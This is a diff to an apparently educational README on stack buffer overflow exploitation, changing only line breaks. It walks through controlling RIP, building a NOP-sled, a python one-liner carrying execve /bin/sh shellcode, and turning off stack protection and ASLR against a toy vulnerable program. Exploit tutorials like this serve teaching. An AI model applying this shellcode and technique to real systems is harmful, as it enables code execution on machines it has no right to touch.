@@ -6,7 +6,7 @@ First of all we need some dependencies
 sudo apt-get install gcc gdb
 ```
 
-We asume that we have _python2.7_ as command python installed beacuse we are going to use _"\xHH"_ for escaping bytes and python3 doesnt handle them very well. Blame _utf8_ by default in this thing _"\xHH"_ in python3.
+We asume that we have _python2.7_ as command python installed beacuse we are going to use _"\xHH"_ for escaping bytes and python3 doesnt handle them very well. Blame _utf8_ by default in this thing _"\xHH"_ in python3.\
 We asume the target system fo the reader is a _linux box x86_64_, in other sistems should follow throught this readme with some minor modifications by the reader
 
 Lets begin with a innocent program
@@ -57,18 +57,18 @@ Now lets check the registers:
 rsp            0x7fffffffdfe0	0x7fffffffdfe0
 rip            0x7f0041414141   0x7f0041414141
 ```
-This means that now we control what the _RIP_ register or (return instruction pointer) point to.
-This is our powerfull weapon becuse if we can control the _RIP_ register we can point it to our malicious code.
+This means that now we control what the _RIP_ register or (return instruction pointer) point to.\
+This is our powerfull weapon becuse if we can control the _RIP_ register we can point it to our malicious code.\
 
-The register _RSP_ point to the top of the current stack frame.
+The register _RSP_ point to the top of the current stack frame.\
 We will need to remember this value for later.
 
 _Lets Introduce the nop-sled:_
 
-The _NOP_ instruction tells the CPU to do nothing and move to the next instruction.
-The _NOP-sled_ is like: picture Boba Fet falling into the Sarlacc pit.
-Anywhere we land into the middle of a _NOP-sled_ we end up in the same place.
-And in the end of the _NOP-sled_ we are going to put our shellcode.
+The _NOP_ instruction tells the CPU to do nothing and move to the next instruction.\
+The _NOP-sled_ is like: picture Boba Fet falling into the Sarlacc pit.\
+Anywhere we land into the middle of a _NOP-sled_ we end up in the same place.\
+And in the end of the _NOP-sled_ we are going to put our shellcode.\
 Then our main idea is to put a big enought _NOP-sled_ that takes almost all the buffer up to almost the address where _RIP_ is.
 
 Again we run our innocent program with a bunch of _NOPs_:
@@ -124,12 +124,12 @@ Mapped address spaces:
       0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
 
 ```
-Our stack is in the region of **0x7ffffffde000-0x7ffffffff000**.
-this means that our _NÖP-sled_ will need to cover all this region and our _RIP_ address will need to point to some place in this region.
-Lets say: **0x7fffffffdead** this value is arbitrary and has to be in range of the register _RSP_, in our case was **0x7fffffffdfe0**.
-This can vary from system to system distributions and kernels.
-In other cases we need to adjust only the last byte of the address like: _(RSP - **our_choosen_value**) < 518_.
-We also need to substract the payload from the _NOP-sled_, the payload is 23 bytes so 524-23
+Our stack is in the region of **0x7ffffffde000-0x7ffffffff000**.\
+this means that our _NÖP-sled_ will need to cover all this region and our _RIP_ address will need to point to some place in this region.\
+Lets say: **0x7fffffffdead** this value is arbitrary and has to be in range of the register _RSP_, in our case was **0x7fffffffdfe0**.\
+This can vary from system to system distributions and kernels.\
+In other cases we need to adjust only the last byte of the address like: _(RSP - **our_choosen_value**) < 518_.\
+We also need to substract the payload from the _NOP-sled_, the payload is 23 bytes so 524-23.
 
 Lets hit it again:
 ```
@@ -139,8 +139,8 @@ Program received signal SIGSEGV, Segmentation fault.
 ```
 We are getting close:
 
-For last we need to add our rip address that is going to be overwriten:
-witch is **0x7fffffffdead** and in the _x86_64_ machine endianess:
+For last we need to add our rip address that is going to be overwriten:\
+witch is **0x7fffffffdead** and in the _x86_64_ machine endianess:\
 We are going to add it more than one time because we are overwriting registers in ram so we dont know where exactly they are we only kknow that we need to be aligned in order for it to work. And we need to substract it from our nop-sled to not overshoot.
 
 Lets try:
@@ -152,10 +152,10 @@ Program received signal SIGSEGV, Segmentation fault.
 
 We got very close:
 
-**0xffffffdead050f99** is not the address we wanted to **0x7fffffffdead**
-**0x7fffffffdead** is our return address in the middle of the nop-sled wen we overflow the RIP register wil point to this address and then the exploit begins.
+**0xffffffdead050f99** is not the address we wanted to **0x7fffffffdead**\
+**0x7fffffffdead** is our return address in the middle of the nop-sled wen we overflow the RIP register wil point to this address and then the exploit begins.\
 
-We need to align our exploit to the machine registers in ram 
+We need to align our exploit to the machine registers in ram \
 A +2 will suffice (this also can vary from system to system somethimes can be +3 or +1)
 
 ```
@@ -182,8 +182,8 @@ Lets inspect our _RIP_:
 0x7fffffffdecd: 0x90909090  0x90909090
 ```
 
-We can seed that effectively we landed in the middle of our nop-sled but nothing happened.
-This is beacuse newer versions of gcc and linux by default set the execution bit of the stack page to disabled.
+We can seed that effectively we landed in the middle of our nop-sled but nothing happened.\
+This is beacuse newer versions of gcc and linux by default set the execution bit of the stack page to disabled.\
 So we need to recompile again our inocent code disabling the stack execution protection.
 
 ```
@@ -204,10 +204,10 @@ Lets try one more thing, lets execute it outside gdb:
 ./vuln $(python -c 'print "\x90" * (524-22-30+2) + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05" + "\x7f\xff\xff\xff\xde\xad"[::-1] * 5  ')
 Segmentation fault
 ```
-WTF? why didn't work?
-Newer versions of linux include ASLR or Address space layout randomization.
-ASLR is a technique of address randomization witch re arranges the internal mappings of the sections of a process memory.
-Our exploit didn't work beacuse we are asumming our program stack is going to be fixed in the range **0x7ffffffde000-0x7ffffffff000** and ASLR efectively prevents it to work beacuse in linux is enabled by defaut.
+WTF? why didn't work?\
+Newer versions of linux include ASLR or Address space layout randomization.\
+ASLR is a technique of address randomization witch re arranges the internal mappings of the sections of a process memory.\
+Our exploit didn't work beacuse we are asumming our program stack is going to be fixed in the range **0x7ffffffde000-0x7ffffffff000** and ASLR efectively prevents it to work beacuse in linux is enabled by defaut.\
 But we can disable it momentarily
 
 ```
